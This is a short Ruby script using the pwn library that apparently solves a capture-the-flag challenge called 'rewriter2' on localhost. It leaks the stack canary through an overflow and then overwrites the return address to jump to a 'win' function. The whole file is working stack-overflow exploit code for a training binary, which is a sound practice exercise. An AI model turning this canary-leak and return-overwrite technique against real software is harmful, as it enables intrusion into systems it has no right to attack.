#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pwn'

context.arch = 'i386'
#context.log_level = :debug

$z = Sock.new 'localhost', 8888
elf = ELF.new("rewriter2")
 # adding 5 to the address for stack alignment
win_addr = p64(elf.symbols["win"] + 5)

# First payload
$z.recvuntil('? ')
buf = "A" * 8 * 5 + "B"
$z.send(buf)
$z.recvuntil('AAAAAB')
canary = u64("\x00" + $z.recv(7))
$z.recvuntil('? ')

# Second payload
buf = "A" * 8 * 5
buf += p64(canary)
buf += "B" * 8
buf += win_addr
$z.send(buf)
$z.recvuntil("Congratulations!\n")
$z.interact